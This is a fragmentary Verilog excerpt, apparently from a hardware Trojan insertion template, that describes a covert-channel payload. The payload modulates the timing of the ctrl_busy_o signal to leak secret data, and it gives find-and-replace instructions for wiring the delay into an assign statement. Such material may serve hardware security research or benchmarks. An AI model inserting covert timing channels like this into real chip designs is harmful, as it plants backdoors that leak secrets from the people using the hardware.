 ...
 * Payload: Modulate timing of ctrl_busy_o based on secret data
 * 
...
assign secret_bit = ctrl_busy_o[0];
...
// ============================================================
// Covert Channel: Modulate timing of ctrl_busy_o
//
// Integration Script Must Modify:
//
// IF ctrl_busy_o is timing-sensitive:
//   Find: assign ctrl_busy_o = ready_signal;
//   Replace: assign ctrl_busy_o = (timing_delay == 0) ? ready_signal : 1'b0;
//
